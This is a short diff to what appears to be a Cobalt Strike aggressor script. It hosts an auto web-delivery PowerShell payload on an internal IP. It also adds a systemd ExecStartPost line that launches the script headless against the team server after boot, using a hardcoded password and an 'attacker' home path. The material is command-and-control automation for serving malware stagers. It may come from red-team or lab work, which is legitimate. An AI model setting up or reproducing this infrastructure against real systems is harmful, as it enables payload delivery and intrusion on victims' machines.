@@ -7,3 +7,7 @@ on ready {
     # Host payload
     site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
 }
+
+# Add below command in "/etc/systemd/system/teamserver.service" file
+
+ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
